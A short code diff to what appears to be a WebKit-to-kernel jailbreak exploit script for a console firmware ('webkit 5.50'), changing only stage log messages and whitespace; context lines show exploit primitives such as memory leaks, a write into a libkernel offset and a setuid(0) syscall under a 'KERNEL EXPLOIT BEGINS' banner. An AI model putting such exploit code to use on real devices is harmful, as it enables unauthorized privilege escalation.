@@ -766,7 +766,7 @@ function swapkeyval(json){
     window.syscalls = {};
 
  
-    log("--- welcome to stage3 ---");
+    log("--- welcome to STAGE 3: Trigger---");
     
     var kview = new Uint8Array(0x1000);
     var kstr = p.leakval(kview).add32(0x10);
@@ -926,12 +926,14 @@ function swapkeyval(json){
     }
       // Clear errno
     p.write8(offsetToLibKernel(0x7CCF0), 0);
+    
+    
     //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
     // KERNEL EXPLOIT BEGINS /////////////////////////////////////////////////////////////////////////////////////////////
     //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
     //alert("OHHH WE'RE HALFWAY THERE WOOOOOOAHHH LIVIN ON A PRAYER")
-
+    
     var test = p.syscall("setuid", 0);
 
     // Check if homebrew has already been enabled, if not, run kernel exploit :D
@@ -1324,7 +1326,10 @@ function mallocu32(size) {
     var pid = p.syscall("getpid", 0)== 0 ;
     var uid = p.syscall("getuid", 0)== 0 ;    
     print("all good. fcall test retval = Successful");
-    print("all Stage test = 95%");
+    print ("--- welcome to STAGE 3: Racing Filters ---");
+    print ("all good. test loader memory = Successful");
+    print ("--- welcome to STAGE4 ---");
+    print("all Stage test = 96%");
     print("....webkit 5.50 Success....");
     
    
